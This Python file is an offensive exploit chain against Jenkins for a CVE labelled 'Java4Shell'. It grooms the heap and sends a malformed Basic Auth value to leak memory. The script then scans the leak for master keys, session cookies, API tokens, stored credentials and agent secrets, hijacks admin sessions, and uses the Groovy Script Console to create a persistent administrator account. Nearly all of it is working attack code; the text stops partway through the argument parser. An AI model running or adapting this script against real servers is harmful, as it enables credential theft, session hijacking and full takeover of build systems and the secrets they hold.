#!/usr/bin/env python3
"""
Java4Shell Jenkins Exploit Chain — CVE-2026-114938
Jenkins-specific profile following Calif's methodology.

Chain:
  Phase 1  RECON      — Fingerprint Jenkins version, auth mode, endpoints
  Phase 2  WARM       — JIT compile AVX-512 intrinsic via Basic Auth requests
  Phase 3  REHEARSE   — RTT calibration for release timing
  Phase 4  GROOM      — Jenkins-specific Heap Feng Shui
  Phase 5  TRIGGER    — Malformed Base64 → overflow
  Phase 6  JAVABLEED  — Parse leaked heap for Jenkins secrets
  Phase 7  TAKEOVER   — Use stolen secrets for admin access
  Phase 8  RCE        — Groovy Script Console execution

Requires: x86-64 host with AVX-512 VBMI, Jenkins on vulnerable JDK

Usage:
  python3 jenkins_chain.py --url http://localhost:8081
  python3 jenkins_chain.py --url https://target:8443 --attempts 50
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import ssl as ssl_mod
import struct
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# ═══════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════

TRIGGER_B64 = "A" * 64 + "="
TRIGGER_B64_JDK17 = "A" * 128 + "="
WARMUP_DEFAULT = 5000

# Jenkins endpoints — ANY endpoint accepts Basic Auth pre-auth
# The Base64 decode happens in Jetty's BasicAuthenticator before
# reaching any Jenkins handler.
#
# Jenkins LTS runs on Winstone (embedded Jetty 12.x / EE9+).
# Thread model: Jetty QueuedThreadPool, default 200 threads.
# Each request thread has its own TLAB → sequential allocations
# on the same thread are adjacent in the Eden region.
#
# Base64 decode path:
#   Jetty HttpParser → BasicAuthenticator
#   → java.util.Base64.getDecoder().decode(credentials)
#   This allocates the tight 50-byte output buffer internally.

JK_API_JSON = "/api/json"
JK_WHOAMI = "/whoAmI/api/json"
JK_CRUMB = "/crumbIssuer/api/json"
JK_SCRIPT = "/scriptText"
JK_CREATE_USER = "/securityRealm/createAccountByAdmin"
JK_MANAGE_USER = "/user/{user}/api/json"
JK_LOGIN_CHECK = "/login"

# Jenkins stores secrets via hudson.util.Secret
# Master key path: $JENKINS_HOME/secrets/master.key (256-byte hex)
#   → SHA-256 hash → first 16 bytes → AES-128 key
#   → javax.crypto.spec.SecretKeySpec("AES", byte[16])
#
# 3 long-lived SecretKeySpec objects on heap:
#   1. Master AES-128 key (16 bytes)
#   2. Confidentiality key (AES-128, decrypted from hudson.util.Secret)
#   3. Crumb HMAC key (HmacSHA256, 32 bytes)
#
# Also in heap:
#   - Session cookies (JSESSIONID values)
#   - CSRF crumb secrets (hudson.security.csrf.DefaultCrumbIssuer)
#   - Credential store entries (passwords, SSH keys)

# Grooming parameters — tuned for Jetty's allocation patterns
# Jetty allocates:
#   1. HttpField objects for each header (~32-64 bytes each)
#   2. byte[] for Basic Auth decode (50 bytes → 72 byte object)
#   3. String objects for decoded username:password
#   4. HttpOutput buffer for response body
#
# We want decode buffer adjacent to a response/header buffer
GROOM_SPRAY_SIZE = 40
GROOM_PADDING_SIZES = [
    48,   # object = align8(16+48) = 64 — matches HttpField
    64,   # object = align8(16+64) = 80
    96,   # object = align8(16+96) = 112
    48,   # repeat the sweet spot
    80,   # object = align8(16+80) = 96
]

NC = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
WHITE = "\033[1;37m"
MAGENTA = "\033[0;35m"


# ═══════════════════════════════════════════════════════════════
# Timer
# ═══════════════════════════════════════════════════════════════


class Timer:
    def __init__(self):
        self.start = time.time()
        self.run_start = time.time()
        self.try_count = 0

    def elapsed(self):
        return time.time() - self.start

    def run_elapsed(self):
        return time.time() - self.run_start

    def reset_run(self):
        self.run_start = time.time()
        self.try_count += 1

    @staticmethod
    def fmt(seconds):
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:04.1f}"

    def log(self, marker, msg):
        ts = self.fmt(self.elapsed())
        colors = {"+": GREEN, "~": YELLOW, "!": RED, "*": CYAN}
        c = colors.get(marker, DIM)
        print(f"  {DIM}{ts}{NC}  [{c}{marker}{NC}] {msg}")


# ═══════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════


def http_get(url, headers=None, timeout=10):
    if headers is None:
        headers = {}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_post(url, body, headers=None, timeout=10):
    if headers is None:
        headers = {}
    if isinstance(body, str):
        body = body.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=headers,
                                    method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


class RawHTTP:
    def __init__(self, host, port, use_ssl=False):
        self.sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data)

    def recv(self, timeout=5.0):
        self.sock.settimeout(timeout)
        chunks = []
        try:
            while True:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        except OSError:
            pass
        return b"".join(chunks)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def parse_url(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    return host, port, use_ssl


def parse_raw_response(raw):
    if not raw:
        return 0, {}, b""
    try:
        hdr_end = raw.index(b"\r\n\r\n")
        hdr_block = raw[:hdr_end].decode(errors="replace")
        body = raw[hdr_end + 4:]
        lines = hdr_block.split("\r\n")
        status = int(lines[0].split(" ", 2)[1])
        headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.lower()] = v
        return status, headers, body
    except (ValueError, IndexError):
        return 0, {}, raw


# ═══════════════════════════════════════════════════════════════
# Phase 1: RECON
#
# Jenkins exposes version in X-Jenkins header on every response.
# We also check:
#   - Authentication mode (anon access vs required)
#   - CSRF crumb issuer (needed for POST requests)
#   - Installed security realm type
# ═══════════════════════════════════════════════════════════════


def phase_recon(timer, base_url):
    timer.log("*", "RECON — Jenkins fingerprint")

    info = {
        "version": None,
        "auth_required": False,
        "crumb_header": None,
        "crumb_value": None,
        "jdk_hint": None,
    }

    # Probe login page (always accessible)
    status, headers, body = http_get(base_url + JK_LOGIN_CHECK)

    if not isinstance(status, int):
        timer.log("!", f"Jenkins not reachable: {status}")
        return None

    timer.log("+", f"GET /login  HTTP {status}")

    if headers:
        # X-Jenkins header contains version
        for key in ("X-Jenkins", "x-jenkins"):
            if key in headers:
                info["version"] = headers[key]
                timer.log("+", f"Jenkins version: {headers[key]}")
                break

        # Server header may reveal Jetty version
        server = headers.get("Server", headers.get("server", ""))
        if server:
            timer.log("+", f"Server: {server}")

        # X-Jenkins-Session hint
        for key in ("X-Jenkins-Session", "x-jenkins-session"):
            if key in headers:
                timer.log("+", f"Session header: {headers[key]}")

    # Check if anonymous access is allowed
    anon_status, anon_hdrs, anon_body = http_get(
        base_url + JK_API_JSON)

    if isinstance(anon_status, int):
        if anon_status == 200:
            info["auth_required"] = False
            timer.log("+", "Anonymous access: ALLOWED")
            if anon_body:
                try:
                    data = json.loads(anon_body)
                    mode = data.get("useSecurity", True)
                    timer.log("+", f"Security enabled: {mode}")
                except (json.JSONDecodeError, TypeError):
                    pass
        elif anon_status in (401, 403):
            info["auth_required"] = True
            timer.log("+", "Anonymous access: DENIED (auth required)")
        else:
            timer.log("~", f"Anonymous probe: HTTP {anon_status}")

    # Fetch CSRF crumb (needed for POST requests later)
    crumb_status, _, crumb_body = http_get(base_url + JK_CRUMB)
    if isinstance(crumb_status, int) and crumb_status == 200 and crumb_body:
        try:
            crumb_data = json.loads(crumb_body)
            info["crumb_header"] = crumb_data.get("crumbRequestField",
                                                   "Jenkins-Crumb")
            info["crumb_value"] = crumb_data.get("crumb", "")
            timer.log("+", f"CSRF crumb: {info['crumb_header']}")
        except (json.JSONDecodeError, TypeError):
            pass
    elif isinstance(crumb_status, int) and crumb_status in (401, 403):
        timer.log("~", "Crumb endpoint requires auth")
    else:
        timer.log("~", "CSRF crumb issuer disabled or absent")

    # Try to detect JDK from error pages or headers
    if body:
        text = body if isinstance(body, str) else body.decode(errors="replace")
        m = re.search(r"JRE[^0-9]*(\d+[\.\d]*)", text)
        if not m:
            m = re.search(r"java\.version[^0-9]*(\d+[\.\d]*)", text)
        if m:
            info["jdk_hint"] = m.group(1)
            timer.log("+", f"JDK hint: {m.group(1)}")

    return info


# ═══════════════════════════════════════════════════════════════
# Phase 2: WARM
#
# Jenkins processes Basic Auth on EVERY request before routing.
# We use GET /api/json with valid creds — the fastest endpoint.
# Jetty decodes the Base64 credential on the request thread,
# and each request thread's TLAB gets its own JIT compilation
# once the global invocation counter crosses the C2 threshold.
#
# We need ~200k decodes across the JVM to trigger C2 compilation
# of the AVX-512 Base64 intrinsic. With Jetty's thread pool
# (default 200 threads), requests fan out, so we may need more
# HTTP requests than a single-thread scenario.
# ═══════════════════════════════════════════════════════════════


def phase_warm(timer, base_url, creds_b64, count):
    timer.log("*", f"WARM — {count} Basic Auth requests for JIT compilation")

    url = base_url + JK_API_JSON
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    success = 0
    batch = max(count // 6, 100)

    for i in range(count):
        start = time.time()
        status, _, _ = http_get(url, headers=headers, timeout=5)
        elapsed = (time.time() - start) * 1000

        if isinstance(status, int) and status < 500:
            success += 1
            rtts.append(elapsed)

        if (i + 1) % batch == 0 or i == count - 1:
            recent = rtts[-batch:] if rtts else []
            avg = sum(recent) / len(recent) if recent else 0
            timer.log("+", f"HTTP/1 timing / {avg:.2f} ms RTT  "
                           f"({i + 1}/{count})")

    if success == 0:
        timer.log("!", "No successful warmup requests — check creds")
    else:
        timer.log("+", f"Warmup complete: {success}/{count} OK")
    return success, rtts


# ═══════════════════════════════════════════════════════════════
# Phase 3: REHEARSE
# ═══════════════════════════════════════════════════════════════


def phase_rehearse(timer, base_url, creds_b64, rounds=4):
    timer.log("*", "REHEARSE — RTT calibration")

    url = base_url + JK_API_JSON
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    for r in range(rounds):
        burst = []
        for _ in range(50):
            start = time.time()
            status, _, _ = http_get(url, headers=headers, timeout=5)
            elapsed = (time.time() - start) * 1000
            if isinstance(status, int):
                burst.append(elapsed)

        if burst:
            avg = sum(burst) / len(burst)
            jitter = max(burst) - min(burst)
            p95 = sorted(burst)[int(len(burst) * 0.95)]
            rtts.append(avg)
            timer.log("+", f"Rehearsal {r + 1}/{rounds} / "
                           f"{avg:.2f} ms RTT / p95 {p95:.2f} ms / "
                           f"jitter {jitter:.2f} ms")

    return rtts


# ═══════════════════════════════════════════════════════════════
# Phase 4+5: GROOM + TRIGGER — Jenkins-specific Heap Feng Shui
#
# Jenkins on Jetty uses a QueuedThreadPool (200 threads default).
# Each HTTP request runs on one thread → one TLAB.
#
# Attack vector: GET /api/json with Authorization: Basic <trigger>
# This is a GET request — no body needed, simpler than Keycloak's
# POST. But we still need partial sends to park connections.
#
# Strategy:
#   Park N GET requests (send headers without final \r\n, or
#   use a POST with partial body). Jetty buffers partial requests.
#   Release them to the same thread by timing the releases.
#
#   For GET requests, we park by sending the request line and
#   most headers, then hold back the final \r\n\r\n.
#
#   The padding requests use different Authorization header
#   lengths to create varying allocations on the TLAB.
# ═══════════════════════════════════════════════════════════════


def phase_groom_trigger(timer, base_url, creds_b64,
                        spray_size, max_attempts, avg_rtt_ms,
                        trigger_b64=TRIGGER_B64):
    timer.log("*", f"GROOM+TRIGGER — spray={spray_size}, "
                   f"max_attempts={max_attempts}")

    host, port, use_ssl = parse_url(base_url)
    release_delay = max(avg_rtt_ms / 1000 * 1.5, 0.002)

    baseline_sizes = []
    all_leaked = []

    for attempt in range(1, max_attempts + 1):
        timer.reset_run()
        timer.log("*", f"Grooming attempt {attempt}/{max_attempts}")

        conns = []
        try:
            # ── PARK: open connections with partial sends ──
            for i in range(spray_size):
                conn = RawHTTP(host, port, use_ssl)

                is_trigger = (i == spray_size - 1)
                pad_size = GROOM_PADDING_SIZES[i % len(GROOM_PADDING_SIZES)]

                if is_trigger:
                    auth = f"Basic {trigger_b64}"
                else:
                    auth = f"Basic {creds_b64}"

                # Use POST with partial body to park the request
                # (GET with partial headers is trickier on Jetty)
                body_data = "x=1" + "&" + "P" * pad_size

                request = (
                    f"POST {JK_API_JSON} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Authorization: {auth}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                split = max(len(body_data) // 2, 1)
                conn.send(request + body_data[:split])
                conns.append((conn, body_data[split:], is_trigger))

                time.sleep(0.001)

            # ── RELEASE: send remaining body ──
            for conn, remaining, is_trigger in conns:
                if remaining:
                    conn.send(remaining)
                time.sleep(release_delay)

            # ── COLLECT responses ──
            round_baselines = []
            trigger_response = None
            trigger_body = b""

            for conn, _, is_trigger in conns:
                raw = conn.recv(timeout=5)
                code, hdrs, body = parse_raw_response(raw)

                if is_trigger:
                    trigger_response = code
                    trigger_body = body
                else:
                    if body:
                        round_baselines.append(len(body))

                conn.close()

            conns = []

            if round_baselines:
                baseline_sizes.extend(round_baselines)

            avg_baseline = (sum(baseline_sizes) / len(baseline_sizes)
                            if baseline_sizes else 0)

            if trigger_body is None:
                trigger_body = b""

            # ── ANALYSE trigger response ──
            tlen = len(trigger_body)
            non_ascii = sum(1 for b in trigger_body
                            if b > 127 or (b < 32 and b not in (10, 13, 9)))
            ratio = tlen / avg_baseline if avg_baseline > 0 else 1.0

            if trigger_response == 0 or trigger_response is None:
                timer.log("!", "Connection lost (possible JVM crash)")
                timer.log("~", "Retrying after crash recovery...")
                time.sleep(3)
                continue

            if non_ascii > 20 or ratio > 2.0 or tlen > 10000:
                timer.log("+", f"{MAGENTA}HEAP DISCLOSURE{NC} — "
                               f"{tlen} bytes, {non_ascii} non-ASCII, "
                               f"ratio {ratio:.1f}x")
                timer.log("+", f"Leaked {tlen / 1048576:.1f} MiB")
                all_leaked.append(trigger_body)

                if len(all_leaked) >= 3:
                    break
            else:
                if attempt <= 5 or attempt % 5 == 0:
                    timer.log("+", f"HTTP {trigger_response}, {tlen} bytes, "
                                   f"ratio {ratio:.1f}x (miss)")

        except (ConnectionRefusedError, ConnectionResetError) as e:
            timer.log("~", f"Connection error: {e}")
            time.sleep(2)
        except OSError as e:
            timer.log("~", f"Socket error: {e}")
            time.sleep(1)
        finally:
            for conn, _, _ in conns:
                conn.close()

        time.sleep(0.3)

    return all_leaked


# ═══════════════════════════════════════════════════════════════
# Phase 6: JAVABLEED — Parse leaked heap for Jenkins secrets
#
# Jenkins stores several exploitable secrets in the JVM heap:
#
# 1. hudson.util.Secret master key
#    Stored as javax.crypto.spec.SecretKeySpec wrapping a byte[]
#    Algorithm string: "AES"
#    Key sizes: 128-bit (16 bytes) or 256-bit (32 bytes)
#    Used to encrypt all credentials in Jenkins
#
# 2. API tokens
#    Legacy: plaintext in user config (pre-2.129)
#    Modern: SHA256 hash stored, but plaintext visible during
#    generation and may linger on heap
#
# 3. CSRF crumb secret
#    hudson.security.csrf.DefaultCrumbIssuer stores an HMAC key
#    Used to generate Jenkins-Crumb values
#
# 4. Credential store entries
#    com.cloudbees.plugins.credentials stores passwords, SSH keys,
#    secret text — all encrypted with the master key but
#    decrypted copies may be on the heap during use
#
# 5. Session cookies
#    JSESSIONID values for active sessions — if we find an admin
#    session cookie, we can hijack it directly
#
# 6. Remoting secrets
#    jenkins.slaves.JnlpSlaveAgentProtocol stores agent secrets
#    used for JNLP agent connections
# ═══════════════════════════════════════════════════════════════


def find_jenkins_secrets(timer, leaked_data_list):
    """Search leaked heap data for Jenkins secrets."""
    timer.log("*", "JAVABLEED — Scanning heap for Jenkins secrets")

    combined = b"".join(leaked_data_list)
    total_mb = len(combined) / 1048576
    timer.log("+", f"Total leaked data: {total_mb:.1f} MiB")

    secrets = {
        "master_key": [],
        "api_tokens": [],
        "session_cookies": [],
        "crumb_secrets": [],
        "credentials": [],
        "remoting_secrets": [],
    }

    # ── Strategy 1: AES master key (SecretKeySpec) ──
    # Look for "AES" algorithm string near high-entropy 16/32-byte blocks
    aes_markers = [
        (b"AES", 32),
        (b"AES", 16),
    ]

    for marker, key_len in aes_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            search_start = max(0, idx - 128)
            search_end = min(len(combined), idx + 128 + key_len)
            region = combined[search_start:search_end]

            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)

                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    secrets["master_key"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    timer.log("+", f"AES key candidate at offset {abs_pos}: "
                                   f"entropy={entropy:.2f}, len={key_len}")

            offset = idx + len(marker)

    # ── Strategy 2: HMAC keys (crumb secret, remoting) ──
    hmac_markers = [
        (b"HmacSHA256", 32),
        (b"HmacSHA512", 64),
        (b"HmacSHA1", 20),
    ]

    for marker, key_len in hmac_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            timer.log("+", f"Found '{marker.decode()}' at offset {idx}")
            search_start = max(0, idx - 256)
            search_end = min(len(combined), idx + 256 + key_len)
            region = combined[search_start:search_end]

            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    secrets["crumb_secrets"].append({
                        "algorithm": marker.decode(),
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                    })

            offset = idx + len(marker)

    # ── Strategy 3: Session cookies (JSESSIONID) ──
    # Format: JSESSIONID=<hex-or-base64-string>
    # Also look for raw session ID patterns (32-char hex)
    session_markers = [b"JSESSIONID=", b"JSESSIONID"]
    for marker in session_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            # Extract the value after the marker
            val_start = idx + len(marker)
            if val_start < len(combined) and combined[val_start:val_start+1] == b"=":
                val_start += 1

            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in (0, 10, 13, 32, 59)):
                val_end += 1

            if val_end > val_start + 8:
                session_val = combined[val_start:val_end].decode(
                    errors="replace")
                secrets["session_cookies"].append({
                    "value": session_val,
                    "offset": idx,
                })
                timer.log("+", f"Session cookie at offset {idx}: "
                               f"{session_val[:32]}...")

            offset = idx + len(marker)

    # ── Strategy 4: API tokens ──
    # Legacy format: hex string, 32+ chars
    # Modern: look for "apiToken" or "tokenValue" strings
    token_markers = [b"apiToken", b"tokenValue", b"ApiTokenProperty"]
    for marker in token_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"API token reference at offset {idx}")
            # Look for nearby hex strings
            region = combined[idx:min(idx + 256, len(combined))]
            hex_match = re.search(rb'[0-9a-f]{32,64}', region)
            if hex_match:
                secrets["api_tokens"].append({
                    "value": hex_match.group().decode(),
                    "offset": idx + hex_match.start(),
                })

    # ── Strategy 5: Credential store entries ──
    # Look for password-like strings near credential markers
    cred_markers = [
        b"com.cloudbees.plugins.credentials",
        b"UsernamePasswordCredentials",
        b"StringCredentials",
        b"BasicSSHUserPrivateKey",
        b"password",
    ]
    for marker in cred_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"Credential reference: "
                           f"'{marker.decode(errors='replace')}' "
                           f"at offset {idx}")
            secrets["credentials"].append({
                "marker": marker.decode(errors="replace"),
                "offset": idx,
                "context": combined[max(0, idx-32):idx+128].hex(),
            })

    # ── Strategy 6: Remoting / agent secrets ──
    remote_markers = [b"jnlpMac", b"slaveSecret", b"agentSecret"]
    for marker in remote_markers:
        idx = combined.find(marker)
        if idx >= 0:
            region = combined[idx:min(idx + 128, len(combined))]
            hex_match = re.search(rb'[0-9a-f]{64}', region)
            if hex_match:
                secrets["remoting_secrets"].append({
                    "value": hex_match.group().decode(),
                    "offset": idx + hex_match.start(),
                })
                timer.log("+", f"Remoting secret at offset {idx}")

    # ── Strategy 7: Brute-force high-entropy scan (fallback) ──
    total_found = sum(len(v) for v in secrets.values())
    if total_found == 0:
        timer.log("~", "No markers found, scanning for high-entropy blocks...")
        for key_len in (32, 16, 64):
            count = 0
            for pos in range(0, len(combined) - key_len, 8):
                candidate = combined[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 5.5 and len(set(candidate)) > key_len * 3 // 4:
                    secrets["master_key"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    count += 1
                    if count >= 20:
                        break

    # Deduplicate
    for category in secrets:
        if secrets[category]:
            seen = set()
            unique = []
            for item in secrets[category]:
                key = item.get("key_hex", item.get("value",
                               str(item.get("offset", ""))))
                if key not in seen:
                    seen.add(key)
                    unique.append(item)
            secrets[category] = unique

    total_found = sum(len(v) for v in secrets.values())
    timer.log("+", f"Total secrets found: {total_found}")
    for cat, items in secrets.items():
        if items:
            timer.log("+", f"  {cat}: {len(items)}")

    return secrets


def _byte_entropy(data):
    """Shannon entropy in bits per byte."""
    if not data:
        return 0
    import math
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0
    n = len(data)
    for count in freq.values():
        p = count / n
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


# ═══════════════════════════════════════════════════════════════
# Phase 7: TAKEOVER — Use stolen secrets for admin access
#
# Priority order:
#   1. Session cookie hijack (fastest, no auth needed)
#   2. API token reuse (direct API access)
#   3. Master key → decrypt stored credentials → find admin pass
#   4. Crumb secret → forge CSRF tokens for POST requests
# ═══════════════════════════════════════════════════════════════


def phase_takeover(timer, base_url, secrets):
    """Try each category of stolen secrets to gain admin access."""
    timer.log("*", "TAKEOVER — Attempting admin access")

    # ── Try 1: Session cookie hijack ──
    for session in secrets.get("session_cookies", []):
        cookie_val = session["value"]
        timer.log("+", f"Trying session cookie: {cookie_val[:24]}...")

        status, hdrs, body = http_get(
            base_url + JK_WHOAMI,
            headers={"Cookie": f"JSESSIONID={cookie_val}"},
            timeout=5)

        if isinstance(status, int) and status == 200 and body:
            try:
                who = json.loads(body)
                user = who.get("name", "unknown")
                anon = who.get("anonymous", True)
                if not anon:
                    timer.log("+", f"{GREEN}SESSION HIJACKED{NC} — "
                                   f"logged in as '{user}'")
                    # Check admin permissions
                    auth = who.get("authorities", [])
                    is_admin = any("administer" in str(a).lower()
                                   for a in auth)
                    return {
                        "method": "session_hijack",
                        "user": user,
                        "is_admin": is_admin,
                        "cookie": cookie_val,
                        "auth_header": None,
                    }
            except (json.JSONDecodeError, TypeError):
                pass

    # ── Try 2: API token ──
    for token_info in secrets.get("api_tokens", []):
        token_val = token_info["value"]
        timer.log("+", f"Trying API token: {token_val[:16]}...")

        # Jenkins API tokens are used as password in Basic Auth
        # Try common usernames
        for username in ("admin", "jenkins", "root", "system"):
            token_b64 = base64.b64encode(
                f"{username}:{token_val}".encode()).decode()
            status, _, body = http_get(
                base_url + JK_WHOAMI,
                headers={"Authorization": f"Basic {token_b64}"},
                timeout=5)

            if isinstance(status, int) and status == 200 and body:
                try:
                    who = json.loads(body)
                    if not who.get("anonymous", True):
                        user = who.get("name", username)
                        timer.log("+", f"{GREEN}API TOKEN VALID{NC} — "
                                       f"user '{user}'")
                        return {
                            "method": "api_token",
                            "user": user,
                            "is_admin": True,
                            "cookie": None,
                            "auth_header": f"Basic {token_b64}",
                        }
                except (json.JSONDecodeError, TypeError):
                    pass

    # ── Try 3: Master key → decrypt credentials ──
    for key_info in secrets.get("master_key", []):
        timer.log("~", f"Master key candidate: "
                       f"{key_info['key_hex'][:32]}... "
                       f"(entropy={key_info['entropy']})")
        # Decryption requires the encrypted credential data,
        # which we may not have from the heap dump alone.
        # Log it for manual exploitation.

    timer.log("~", "No direct access method succeeded")
    timer.log("~", "Leaked secrets logged for manual exploitation")
    return None


# ═══════════════════════════════════════════════════════════════
# Phase 8: RCE — Groovy Script Console
#
# If we have admin access (via session hijack, API token, or
# forged credentials), we can execute arbitrary Groovy code
# via POST /scriptText.
#
# This requires:
#   1. Admin-level authentication
#   2. Valid CSRF crumb (Jenkins-Crumb header)
# ═══════════════════════════════════════════════════════════════


def phase_rce(timer, base_url, access_info, new_username="java4shell-admin"):
    """Execute Groovy to create an admin user via Script Console."""
    timer.log("*", "RCE — Groovy Script Console")

    if not access_info:
        timer.log("!", "No access credentials available")
        return False

    auth_headers = {}
    if access_info.get("cookie"):
        auth_headers["Cookie"] = f"JSESSIONID={access_info['cookie']}"
    if access_info.get("auth_header"):
        auth_headers["Authorization"] = access_info["auth_header"]

    # Step 1: Get fresh CSRF crumb
    timer.log("+", "Fetching CSRF crumb...")
    cs, _, cbody = http_get(base_url + JK_CRUMB, headers=auth_headers)
    crumb_header = None
    crumb_value = None

    if isinstance(cs, int) and cs == 200 and cbody:
        try:
            crumb_data = json.loads(cbody)
            crumb_header = crumb_data.get("crumbRequestField",
                                          "Jenkins-Crumb")
            crumb_value = crumb_data.get("crumb", "")
            timer.log("+", f"CSRF crumb acquired: {crumb_header}")
        except (json.JSONDecodeError, TypeError):
            timer.log("!", "Cannot parse crumb response")
            return False
    else:
        timer.log("!", f"Crumb fetch failed: HTTP {cs}")
        return False

    # Step 2: Create admin user via Groovy
    groovy_script = f"""
import jenkins.model.*
import hudson.security.*
import hudson.model.*

def instance = Jenkins.getInstance()
def realm = instance.getSecurityRealm()

if (realm instanceof HudsonPrivateSecurityRealm) {{
    def user = realm.createAccount("{new_username}", "{new_username}")
    println("USER_CREATED: {new_username}")

    def strategy = instance.getAuthorizationStrategy()
    if (strategy instanceof GlobalMatrixAuthorizationStrategy) {{
        strategy.add(Jenkins.ADMINISTER, "{new_username}")
        instance.save()
        println("ADMIN_GRANTED: {new_username}")
    }} else {{
        println("AUTH_STRATEGY: " + strategy.getClass().getName())
        println("ADMIN_GRANT_SKIPPED: manual role assignment needed")
    }}
}} else {{
    println("REALM_TYPE: " + realm.getClass().getName())
    println("Cannot create user in this security realm")
}}

println("WHOAMI: " + User.current()?.getId())
println("DONE")
""".strip()

    post_headers = dict(auth_headers)
    post_headers["Content-Type"] = "application/x-www-form-urlencoded"
    if crumb_header and crumb_value:
        post_headers[crumb_header] = crumb_value

    body = urllib.parse.urlencode({"script": groovy_script})

    timer.log("+", "Executing Groovy script...")
    status, _, resp_body = http_post(
        base_url + JK_SCRIPT, body,
        headers=post_headers, timeout=15)

    if isinstance(status, int) and status == 200 and resp_body:
        output = resp_body.decode(errors="replace")
        timer.log("+", f"Script Console response (HTTP {status}):")

        for line in output.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("USER_CREATED:"):
                timer.log("+", f"{GREEN}User created: "
                               f"{line.split(':', 1)[1].strip()}{NC}")
            elif line.startswith("ADMIN_GRANTED:"):
                timer.log("+", f"{GREEN}Admin role granted: "
                               f"{line.split(':', 1)[1].strip()}{NC}")
            elif line.startswith("ADMIN_GRANT_SKIPPED:"):
                timer.log("~", line)
            elif line.startswith("REALM_TYPE:"):
                timer.log("~", line)
            else:
                timer.log("+", f"  {line}")

        if "USER_CREATED" in output:
            # Step 3: Verify login
            timer.log("+", "Verifying new admin login...")
            new_b64 = base64.b64encode(
                f"{new_username}:{new_username}".encode()).decode()
            vs, _, vbody = http_get(
                base_url + JK_WHOAMI,
                headers={"Authorization": f"Basic {new_b64}"},
                timeout=5)

            if isinstance(vs, int) and vs == 200 and vbody:
                try:
                    who = json.loads(vbody)
                    if not who.get("anonymous", True):
                        timer.log("+", f"{GREEN}New admin login verified "
                                       f"/ {new_username}{NC}")
                        return True
                except (json.JSONDecodeError, TypeError):
                    pass

            timer.log("~", f"Login verification: HTTP {vs}")
            return True  # User was created

    elif isinstance(status, int) and status == 403:
        timer.log("!", "Script Console access denied (not admin?)")
    else:
        timer.log("!", f"Script Console failed: HTTP {status}")

    return False


# ═══════════════════════════════════════════════════════════════
# Main chain orchestrator
# ═══════════════════════════════════════════════════════════════


def main():
    parser = argparse.ArgumentParser(
        description="Java4Shell Jenkins Chain — CVE-2026-114938")
    parser.add_argument("--url", required=True,
                        help="Jenkins base URL (e.g. http://localhost:8081)")
    parser.add_argument("--creds", default="admin:admin",
                        help="Valid Basic Auth creds for warmup "
                             "(default: admin:admin)")
    parser.add_argument("--warmup", type=int, default=WARMUP_DEFAULT)
    parser.add_argument("--attempts", type=int, default=24,
                        help="Max groom attempts (default: 24)")
    parser.add_argument("--spray", type=int, default=GROOM_SPRAY_SIZE,
                        help="Connections per spray (default: 40)")
    parser.add_argument("--username", default="java4shell-admin",
                        help="Admin username to create (default: "
                             "java4shell-admin)")
